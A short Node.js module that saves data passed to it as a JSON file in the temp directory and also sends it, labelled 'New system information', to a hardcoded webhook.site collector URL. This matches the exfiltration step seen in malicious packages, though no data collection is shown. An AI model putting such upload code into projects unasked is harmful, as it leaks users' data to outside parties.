const fs = require('fs');
const os = require('os');
const path = require('path');
const { IncomingWebhook } = require('@slack/webhook');

function saveInfoToFile(data, fileName) {
  const tempDir = os.tmpdir();
  const filePath = path.join(tempDir, fileName);
  const fileContent = JSON.stringify(data, null, 2);
  fs.writeFileSync(filePath, fileContent);

  const webhookUrl = 'https://webhook.site/295ad9de-0f52-4615-957a-0e5f99e87336'; // replace with your webhook URL
  const webhook = new IncomingWebhook(webhookUrl);
  const message = {
    text: 'New system information',
    attachments: [{
      filename: fileName,
      content: JSON.parse(fileContent),
      contentType: 'application/json'
    }]
  };
  webhook.send(message);
}

module.exports = { saveInfoToFile };
